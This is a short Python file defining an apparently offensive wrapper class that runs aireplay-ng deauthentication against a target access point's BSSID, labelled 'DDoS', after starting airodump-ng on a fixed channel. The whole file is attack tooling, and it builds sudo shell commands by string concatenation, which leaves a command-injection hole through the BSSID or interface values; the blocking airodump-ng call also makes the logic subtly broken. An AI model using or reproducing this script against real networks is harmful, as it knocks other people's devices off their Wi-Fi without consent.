import os
import asyncio



class Aireplay:
    
    def __init__(self, ap):
        self.ap = ap
        self.command = 'aireplay-ng'


    async def DDoS(self, interface):
        await self.channel(interface)
        os.system('sudo '+ self.command + ' -0 10 -a '+ self.ap.bssid +' '+ interface)
        
        return 1
    
    async def channel(self, interface):
        os.system('sudo airodump-ng -c 2 '+ interface)
